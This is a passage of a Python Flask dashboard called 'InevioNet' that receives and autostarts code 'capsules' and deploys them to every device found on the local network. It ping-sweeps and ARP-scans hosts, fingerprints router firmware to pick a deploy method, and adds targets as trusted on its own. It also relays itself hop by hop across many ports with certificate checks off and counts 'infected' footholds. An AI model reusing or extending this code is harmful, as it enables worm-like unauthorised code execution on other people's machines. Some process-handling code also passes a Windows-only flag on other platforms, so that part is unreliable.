                creationflags=_sp.CREATE_NEW_PROCESS_GROUP if sys.platform == 'win32' else 0,
                close_fds=True,
            )
            started_pid = proc.pid
            log.info('[Capsule] autostarted PID=%d', started_pid)
        except Exception as _e:
            log.error('[Capsule] autostart failed: %s', _e)

        # Register
        with _capsule_received_lock:
            _capsule_received[code_hash] = {
                'hash': code_hash,
                'bytes': len(data),
                'files': len(py_files),
                'extract_dir': extract_dir,
                'pid': started_pid,
                'received_at': time.time(),
            }

        return jsonify({
            'success': True,
            'bytes': len(data),
            'files': len(py_files),
            'hash': code_hash[:16],
            'pid': started_pid,
            'autostarted': started_pid is not None,
            'extract_dir': extract_dir,
        })
    except Exception as e:
        log.error('[Capsule] receive error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/capsule/registry')
def api_capsule_registry():
    """P17: list received capsules."""
    try:
        with _capsule_received_lock:
            caps = list(_capsule_received.values())
        return jsonify({'success': True, 'capsules': caps})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500



@app.route('/api/capsule/reset_counter', methods=['POST'])
def api_capsule_reset_counter():
    """P18: reset autostart counter."""
    global _autostart_counter
    _autostart_counter = 0
    log.info('[Capsule] autostart counter reset')
    return jsonify({'success': True, 'counter': _autostart_counter})



@app.route('/api/capsule/kill', methods=['POST'])
def api_capsule_kill():
    """P19: emergency stop — kill all autostarted capsules."""
    import subprocess as _sp
    global _autostart_counter
    try:
        # Block future autostarts
        _autostart_counter = _MAX_AUTOSTART

        # Find and kill python processes (except our own)
        my_pid = os.getpid()
        killed = 0
        try:
            if sys.platform == "win32":
                r = _sp.run(
                    ["wmic", "process", "where",
                     "name='python.exe'", "get", "ProcessId,CommandLine"],
                    capture_output=True, text=True, timeout=10,
                creationflags=CREATE_NO_WINDOW,
            )
                for line in r.stdout.splitlines():
                    if "run_capsule.py" in line or "capsule_" in line:
                        try:
                            parts = line.strip().split()
                            pid = int(parts[-1])
                            if pid != my_pid:
                                _sp.run(["taskkill", "/F", "/PID", str(pid)],
                                        capture_output=True, timeout=5,
                creationflags=CREATE_NO_WINDOW,
            )
                                killed += 1
                        except (ValueError, IndexError):
                            pass
            else:
                r = _sp.run(
                    ["pgrep", "-f", "run_capsule.py"],
                    capture_output=True, text=True, timeout=5,
                creationflags=CREATE_NO_WINDOW,
            )
                for line in r.stdout.splitlines():
                    try:
                        pid = int(line.strip())
                        if pid != my_pid:
                            _sp.run(["kill", "-9", str(pid)],
                                    capture_output=True, timeout=5,
                creationflags=CREATE_NO_WINDOW,
            )
                            killed += 1
                    except ValueError:
                        pass
        except Exception as e:
            log.error('[Kill] error: %s', e)

        log.warning('[Capsule] KILL: %d processes terminated, autostart blocked',
                    killed)
        return jsonify({
            'success': True,
            'killed': killed,
            'autostart_blocked': True,
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500



@app.route('/api/capsule/deploy_all', methods=['POST'])
def api_capsule_deploy_all():
    """P20: deploy to ALL discovered nodes (try each)."""
    try:
        n = get_net()
        if not hasattr(n, 'capsule_builder'):
            return jsonify({'success': False, 'error': 'no_capsule'}), 500

        # Build capsule once
        try:
            code = n.capsule_builder.build_minimal()
        except Exception as e:
            return jsonify({'success': False, 'error': 'build_failed: ' + str(e)}), 500

        # Get all nodes
        nodes = snapshot()
        results = []
        deployed_count = 0
        skipped_count = 0
        failed_count = 0

        # Types that CANNOT be deployed to
        no_os_types = {'wifi', 'bluetooth', 'ble', 'cellular', 'spore', 'super', 'industrial'}

        for nid, node in nodes.items():
            ntype = node.get('type', 'unknown')
            ip = node.get('ip', '')

            # Skip self
            if ntype == 'self':
                results.append({
                    'node_id': nid, 'type': ntype,
                    'status': 'skip', 'skip_reason': 'self',
                })
                skipped_count += 1
                continue

            # Skip no-OS nodes
            if ntype in no_os_types:
                results.append({
                    'node_id': nid, 'type': ntype,
                    'status': 'skip', 'skip_reason': 'no_os',
                })
                skipped_count += 1
                continue

            # Skip unknown IP
            if not ip or ip == 'unknown':
                results.append({
                    'node_id': nid, 'type': ntype,
                    'status': 'skip', 'skip_reason': 'no_ip',
                })
                skipped_count += 1
                continue

            # Try deploy
            target = ip
            port = node.get('port', 0)
            if port:
                target = f"{ip}:{port}"

            # P24: router reconnaissance
            recon = None
            if ntype in ('router', 'device'):
                try:
                    from inevionet.network.router_recon import identify_firmware
                    # P28: extract MAC from node or from node_id (arp_XXXX)
                    mac = node.get('mac', '')
                    if not mac and nid.startswith('arp_'):
                        _raw = nid[4:]
                        if len(_raw) == 12:
                            mac = ':'.join(_raw[i:i+2] for i in range(0, 12, 2))
                    recon = identify_firmware(ip, mac)
                    log.info('[Recon] %s mac=%s vendor=%s can=%s',
                             ip, mac, recon.get('vendor'), recon.get('can_deploy'))
                except Exception as _re:
                    log.debug('[Recon] error: %s', _re)

            if recon and not recon.get('can_deploy', False):
                skipped_count += 1
                results.append({
                    'node_id': nid, 'target': target, 'type': ntype,
                    'status': 'skip',
                    'skip_reason': 'no_deploy_method',
                    'vendor': recon.get('vendor', '?'),
                    'firmware': recon.get('firmware', '?'),
                    'notes': recon.get('notes', ''),
                })
                continue

            # Add as trusted
            try:
                n.trusted_hosts.add(target, label=nid, method='auto')
            except Exception:
                pass

            try:
                # P32: use recon method if available
                deploy_method = 'auto'
                if recon and recon.get('deploy_method'):
                    deploy_method = recon['deploy_method']
                ok = n.capsule_deployer.deploy(target, code, method=deploy_method)
                if ok:
                    deployed_count += 1
                    results.append({
                        'node_id': nid,
                        'target': target,
                        'type': ntype,
                        'status': 'deployed',
                        'vendor': (recon or {}).get('vendor', '?'),
                        'firmware': (recon or {}).get('firmware', '?'),
                    })
                else:
                    failed_count += 1
                    results.append({
                        'node_id': nid,
                        'target': target,
                        'type': ntype,
                        'status': 'failed',
                    })
            except Exception as e:
                failed_count += 1
                results.append({
                    'node_id': nid,
                    'target': target,
                    'type': ntype,
                    'status': 'error',
                    'error': str(e),
                })

        log.info('[DeployAll] deployed=%d failed=%d skipped=%d',
                 deployed_count, failed_count, skipped_count)

        return jsonify({
            'success': True,
            'deployed': deployed_count,
            'failed': failed_count,
            'skipped': skipped_count,
            'results': results,
            'total_nodes': len(nodes),
        })
    except Exception as e:
        log.error('[DeployAll] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500



@app.route('/api/router/scan', methods=['POST'])
def api_router_scan():
    """P24: scan router and identify firmware."""
    d = request.json or {}
    ip = (d.get('ip') or '').strip()
    mac = d.get('mac', '')
    if not ip:
        return jsonify({'success': False, 'error': 'no_ip'}), 400
    try:
        from inevionet.network.router_recon import identify_firmware
        info = identify_firmware(ip, mac)
        # Update node
        nodes = snapshot()
        for nid, node in nodes.items():
            if node.get('ip') == ip:
                node['vendor'] = info.get('vendor')
                node['firmware'] = info.get('firmware')
                node['can_deploy'] = info.get('can_deploy')
                node['deploy_method'] = info.get('deploy_method')
                node['recon_notes'] = info.get('notes')
                upsert(node)
        return jsonify({'success': True, 'info': info})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500



# P40: probe ports and schemes (try in order)
PROBE_TARGETS = [
    (8443, "https"), (8080, "https"), (8080, "http"),
    (8081, "https"), (8081, "http"),
    (443, "https"), (80, "http"),
    (9090, "https"), (9090, "http"),
    (3000, "http"), (5000, "http"),
    (8000, "http"), (8888, "http"),
    (9443, "https"), (10443, "https"),
    (7000, "https"), (7001, "https"),
    (8008, "http"), (8009, "http"),
    (9000, "http"), (9001, "http"),
]


def _probe_one_host(ip, our_map, from_node, max_hops=5, timeout=2, hops=0, visited=None):
    """P44: try multiple ports/schemes. Recursive with visited.

    P90b: если ip содержит ':', разделяем host:port.
    Если порт указан — пробуем только его.
    """
    # P90b: parse host:port
    _explicit_port = None
    if ':' in ip:
        try:
            _host, _port_s = ip.rsplit(':', 1)
            _explicit_port = int(_port_s)
            ip = _host
        except Exception:
            _explicit_port = None
    import urllib.request as _url
    import ssl as _ssl
    import json as _json
    ctx = _ssl._create_unverified_context()
    payload = _json.dumps({
        'from_node': from_node,
        'hops': hops,
        'max_hops': max_hops,
        'map': our_map,
        'visited': list(visited or []),
    }).encode()
    # P90b: explicit port first
    _targets = list(PROBE_TARGETS)
    if _explicit_port:
        _targets = [(_explicit_port, "http"), (_explicit_port, "https")] + _targets

    for port, scheme in _targets:
        url = f"{scheme}://{ip}:{port}/api/network/map"
        try:
            req = _url.Request(
                url, data=payload,
                headers={'Content-Type': 'application/json'},
                method='POST')
            with _url.urlopen(req, timeout=timeout, context=ctx) as resp:
                data = _json.loads(resp.read().decode('utf-8'))
            # P45/P50: skip if it's our own node_id
            their_id = data.get('node_id', '')
            if their_id and their_id == from_node:
                continue  # try next port
            if not their_id:
                # P50: no node_id in response -> skip
                continue
            return {
                'success': True,
                'ip': ip,
                'url': url,
                'port': port,
                'scheme': scheme,
                'data': data,
            }
        except Exception:
            continue
    return {'success': False, 'ip': ip}


@app.route('/api/network/map', methods=['GET', 'POST'])
def api_network_map():
    """P38: get/merge network map (mycelium growth)."""
    n = get_net()
    topo = getattr(n, '_auto_topology', None)
    if topo is None:
        try:
            topo = n.enable_auto_topology()
        except Exception:
            topo = None
    if topo is None:
        return jsonify({'success': False, 'error': 'no_topology'}), 500

    if request.method == 'GET':
        return jsonify({
            'success': True,
            'node_id': n.node_id,
            'map': topo.export_map(),
        })

    # POST: merge incoming map
    d = request.get_json(silent=True) or {}
    other_map = d.get('map', {})
    from_node = d.get('from_node', 'unknown')
    hops = int(d.get('hops', 0))
    max_hops = int(d.get('max_hops', 5))

    if not other_map:
        return jsonify({'success': False, 'error': 'empty_map'}), 400

    merged = topo.merge(other_map, via_node_id=from_node)
    log.info('[Growth] merged map from %s via=%s (+%d nodes, +%d edges)',
             from_node, from_node, merged.get('added_nodes', 0),
             merged.get('added_edges', 0))

    # P77f: audit merge
    try:
        if getattr(n, "audit", None):
            n.audit.add_event("merge", {
                "from_node": from_node,
                "added_nodes": merged.get('added_nodes', 0),
                "added_edges": merged.get('added_edges', 0),
            })
    except Exception:
        pass

    # P73: обновить gravity - from_node имеет массу
    try:
        if getattr(n, "gravity", None):
            n.gravity.add_mass(from_node, 1.0)
            # рёбра от from_node ко всем новым узлам
            for nid in other_map.get("nodes", {}).keys():
                if nid != from_node:
                    n.gravity.set_edge(from_node, nid, 0.7)
    except Exception as _ge:
        log.debug('[P73] gravity update: %s', _ge)

    # P38: register transit pheromone
    try:
        n.mycelium.pheromones.mark_transit(
            source=from_node, destination=n.node_id,
            via=from_node, path=[from_node, n.node_id])
    except Exception:
        pass

    # P44: propagate further with multi-port + visited
    propagated = 0
    visited = list(d.get('visited', []))
    if n.node_id not in visited:
        visited.append(n.node_id)
    if hops < max_hops:
        import threading as _th
        def _propagate():
            nonlocal propagated
            try:
                our_map = topo.export_map()
                nodes = snapshot()
                # collect targets (ARP devices, exclude self/from)
                my_ips = set()
                try:
                    import socket as _s
                    for info in _s.getaddrinfo(_s.gethostname(), None):
                        my_ips.add(info[4][0])
                except Exception:
                    pass
                target_ips = []
                for nid, node in nodes.items():
                    if node.get('type') not in ('router', 'device'):
                        continue
                    ip = node.get('ip')
                    if not ip or ip == from_node or ip in my_ips:
                        continue
                    target_ips.append(ip)
                if not target_ips:
                    return
                # use multi-port probe
                try:
                    _probe = _probe_one_host
                except Exception:
                    _probe = None
                if not _probe:
                    return
                import concurrent.futures as _cf
                def _try(ip):
                    return _probe(ip, our_map, n.node_id, max_hops,
                                  timeout=1, hops=hops + 1,
                                  visited=visited)
                with _cf.ThreadPoolExecutor(max_workers=8) as _ex:
                    for r in _ex.map(_try, target_ips):
                        if r.get('success'):
                            propagated += 1
                            other_map = (r.get('data') or {}).get('our_map') or {}
                            if other_map:
                                topo.merge(other_map)
                            log.info('[Map] propagated to %s (%s:%d)',
                                     r['ip'], r['scheme'], r['port'])
            except Exception as _pe:
                log.debug('[Map] propagate error: %s', _pe)
        _th.Thread(target=_propagate, daemon=True).start()

    return jsonify({
        'success': True,
        'node_id': n.node_id,
        'merged': merged,
        'our_map': topo.export_map(),
        'propagated': propagated,
    })


@app.route('/api/network/scan', methods=['POST'])
def api_network_scan():
    """P40: scan all ARP devices for InevioNet on ANY port/scheme."""
    d = request.get_json(silent=True) or {}
    timeout = float(d.get('timeout', 2))
    n = get_net()
    topo = getattr(n, '_auto_topology', None)
    if topo is None:
        topo = n.enable_auto_topology()
    our_map = topo.export_map()

    ips = set()
    nodes = snapshot()
    for nid, node in nodes.items():
        if node.get('type') in ('router', 'device') and node.get('ip'):
            ips.add(node['ip'])
    try:
        from inevionet.network.arp_scanner import scan_arp
        for dev in scan_arp():
            if dev.get('ip'):
                ips.add(dev['ip'])
    except Exception:
        pass
    my_ips = set()
    try:
        import socket as _s
        for info in _s.getaddrinfo(_s.gethostname(), None):
            my_ips.add(info[4][0])
    except Exception:
        pass
    ips = list(ips - my_ips)

    import concurrent.futures
    found = []
    merged_total = {'added_nodes': 0, 'added_edges': 0}
    def _try(ip):
        return _probe_one_host(ip, our_map, n.node_id, 5, timeout=timeout)
    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
        for r in ex.map(_try, ips):
            if r.get('success'):
                found.append({
                    'ip': r['ip'],
                    'url': r['url'],
                    'port': r['port'],
                    'scheme': r['scheme'],
                })
                other_map = (r.get('data') or {}).get('our_map') or {}
                if other_map:
                    m = topo.merge(other_map)
                    merged_total['added_nodes'] += m.get('added_nodes', 0)
                    merged_total['added_edges'] += m.get('added_edges', 0)

    log.info('[NetScan] scanned=%d found=%d', len(ips), len(found))
    return jsonify({
        'success': True,
        'scanned': len(ips),
        'found': found,
        'found_count': len(found),
        'merged': merged_total,
        'stats': topo.get_stats(),
    })


@app.route('/api/network/depth', methods=['POST'])
def api_network_depth():
    """P44: depth probe — recursive map exchange with TTL."""
    d = request.get_json(silent=True) or {}
    max_hops = int(d.get('max_hops', 5))
    target = d.get('target')
    n = get_net()
    topo = getattr(n, '_auto_topology', None) or n.enable_auto_topology()
    our_map = topo.export_map()

    # collect targets
    targets = []
    if target:
        targets = [target.split(':')[0]]
    else:
        ips = set()
        nodes = snapshot()
        for nid, node in nodes.items():
            if node.get('type') in ('router', 'device') and node.get('ip'):
                ips.add(node['ip'])
        try:
            from inevionet.network.arp_scanner import scan_arp
            for dev in scan_arp():
                if dev.get('ip'):
                    ips.add(dev['ip'])
        except Exception:
            pass
        my_ips = set()
        try:
            import socket as _s
            for info in _s.getaddrinfo(_s.gethostname(), None):
                my_ips.add(info[4][0])
        except Exception:
            pass
        targets = list(ips - my_ips)

    import concurrent.futures
    found = []
    merged_total = {'added_nodes': 0, 'added_edges': 0}
    def _try(ip):
        return _probe_one_host(ip, our_map, n.node_id, max_hops,
                               timeout=2, hops=0,
                               visited=[n.node_id])
    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
        for r in ex.map(_try, targets):
            if r.get('success'):
                found.append({
                    'ip': r['ip'], 'url': r['url'],
                    'port': r['port'], 'scheme': r['scheme'],
                })
                other_map = (r.get('data') or {}).get('our_map') or {}
                if other_map:
                    m = topo.merge(other_map)
                    merged_total['added_nodes'] += m.get('added_nodes', 0)
                    merged_total['added_edges'] += m.get('added_edges', 0)

    stats = topo.get_stats()
    log.info('[Depth] scanned=%d found=%d +%d nodes, +%d edges',
             len(targets), len(found),
             merged_total['added_nodes'], merged_total['added_edges'])

    return jsonify({
        'success': True,
        'scanned': len(targets),
        'found': found,
        'found_count': len(found),
        'merged': merged_total,
        'stats': stats,
        'max_hops': max_hops,
    })


@app.route('/api/network/probe', methods=['POST'])
def api_network_probe():
    """P38: send probe to neighbors (recursive map request)."""
    d = request.get_json(silent=True) or {}
    max_hops = int(d.get('max_hops', 5))
    target = d.get('target')

    n = get_net()
    topo = getattr(n, '_auto_topology', None)
    if topo is None:
        try:
            topo = n.enable_auto_topology()
        except Exception:
            topo = None
    if topo is None:
        return jsonify({'success': False, 'error': 'no_topology'}), 500

    our_map = topo.export_map()

    # P38: create probe-spore
    try:
        spore = n.mycelium.spores.create_probe(
            node_id=n.node_id,
            target_network=target or "broadcast",
            ttl=max_hops)
        spore_id = spore.spore_id
    except Exception:
        spore_id = None

    targets = []
    if target:
        # target may be "ip" or "ip:port"
        targets = [target.split(':')[0]]
    else:
        ips = set()
        nodes = snapshot()
        for nid, node in nodes.items():
            if node.get('type') in ('router', 'device') and node.get('ip'):
                ips.add(node['ip'])
        try:
            from inevionet.network.arp_scanner import scan_arp
            for dev in scan_arp():
                if dev.get('ip'):
                    ips.add(dev['ip'])
        except Exception as _e:
            log.debug('[Probe] arp scan: %s', _e)
        # exclude self
        my_ips = set()
        try:
            import socket as _s
            for info in _s.getaddrinfo(_s.gethostname(), None):
                my_ips.add(info[4][0])
        except Exception:
            pass
        targets = list(ips - my_ips)

    sent = 0
    merged_total = {"added_nodes": 0, "added_edges": 0}
    found_list = []
    import concurrent.futures
    def _try(ip):
        return _probe_one_host(ip, our_map, n.node_id, max_hops, timeout=2)
    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
        for r in ex.map(_try, targets):
            if r.get('success'):
                sent += 1
                found_list.append({
                    'ip': r['ip'], 'url': r['url'],
                    'port': r['port'], 'scheme': r['scheme'],
                })
                other_map = (r.get('data') or {}).get('our_map') or {}
                if other_map:
                    m = topo.merge(other_map)
                    merged_total['added_nodes'] += m.get('added_nodes', 0)
                    merged_total['added_edges'] += m.get('added_edges', 0)
                log.info('[Probe] FOUND %s (%s:%d)',
                         r['ip'], r['scheme'], r['port'])
            else:
                log.info('[Probe] %s: no InevioNet on any port', r['ip'])

    # P38: save merged map into spore
    if spore_id:
        try:
            n.mycelium.spores.merge_map(spore_id, topo.export_map())
        except Exception:
            pass

    stats = topo.get_stats()
    log.info('[Growth] PROBE: sent=%d merged=+%d nodes, +%d edges; total nodes=%d edges=%d',
             sent, merged_total['added_nodes'], merged_total['added_edges'],
             stats.get('nodes', 0), stats.get('edges', 0))

    return jsonify({
        'success': True,
        'sent': sent,
        'found': found_list,
        'merged': merged_total,
        'stats': stats,
        'spore_id': spore_id,
    })


@app.route('/api/network/sweep', methods=['POST'])
def api_network_sweep():
    """P25: ping sweep + ARP scan."""
    d = request.json or {}
    subnet = d.get('subnet', None)
    try:
        from inevionet.network.arp_scanner import ping_sweep, scan_arp
        alive = ping_sweep(subnet=subnet, timeout=0.3, max_workers=64)
        # Scan ARP after sweep (force — skip cache)
        devices = scan_arp(force=True)

        # Add to nodes
        for dev in devices:
            nid = 'arp_' + dev['mac'].replace(':', '')
            upsert({
                'node_id': nid,
                'name': '%s (%s)' % (dev['ip'], dev['type']),
                'label': dev['ip'],
                'type': dev['type'],
                'ip': dev['ip'],
                'port': 0,
                'trust': 60.0,
                'packets': 0,
                'online': True,
                'rssi': -50,
                'signal': 80,
                'method': 'ping_sweep',
                'evolving': False,
                'parent': None,
                'mac': dev['mac'],
            })

        return jsonify({
            'success': True,
            'alive': alive,
            'devices_found': len(devices),
            'devices': devices,
        })
    except Exception as e:
        log.error('[Sweep] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@socketio.on('connect')
def handle_connect():
    emit('nodes_update', {
        'nodes': snapshot(),
        'count': len(snapshot()),
        'timestamp': time.time(),
        'evo_log': [],
        'infected': len(get_footholds()),
    })


@socketio.on('request_stats')
def handle_request_stats():
    try:
        emit('stats_update', get_net().get_stats())
    except Exception:
        pass


# ================================================================
# MAIN
# ================================================================
if __name__ == '__main__':
    PORT = int(os.environ.get('INEVIO_PORT', 8080))
    install_log_bridge()
    log.info('InevioNet Web Dashboard v%s', __version__)

    # P58: TLS только если сертификат ВАЛИДНЫЙ и порт 8443
    # В EXE (frozen) - по умолчанию HTTP (браузер не отвергает)
    ssl_ctx = None
    use_tls = False

    # P58: отключаем TLS в EXE (браузер не принимает self-signed)
    is_frozen = getattr(sys, 'frozen', False)
    force_tls = os.environ.get('INEVIO_TLS', '').lower() in ('1', 'true', 'yes')

    if (not is_frozen) or force_tls:
        try:
            import pathlib
            # P57: portable data dir
            data_home = os.environ.get('INEVIO_DATA_DIR') or os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                'data')
            cd = pathlib.Path(data_home) / 'tls'
            if (cd / 'cert.pem').exists() and (cd / 'key.pem').exists():
                ssl_ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_SERVER)
                ssl_ctx.load_cert_chain(str(cd / 'cert.pem'), str(cd / 'key.pem'))
                use_tls = True
                print('[TLS] HTTPS включен: https://localhost:%d' % PORT)
            else:
                print('[TLS] сертификаты не найдены — HTTP: http://localhost:%d' % PORT)
        except Exception as e:
            print('[TLS] выключен:', e)
    else:
        print('[TLS] EXE mode — HTTP: http://localhost:%d' % PORT)

    socketio.start_background_task(background_scanner)
    # P64a: eventlet does not accept ssl_context in wsgi.server
    _run_kwargs = dict(
        host='0.0.0.0',
        port=PORT,
        debug=False,
        allow_unsafe_werkzeug=True,
    )
    try:
        _am = getattr(socketio, 'async_mode', '') or ''
    except Exception:
        _am = ''
    if use_tls and _am != 'eventlet':
        _run_kwargs['ssl_context'] = ssl_ctx
    socketio.run(app, **_run_kwargs)

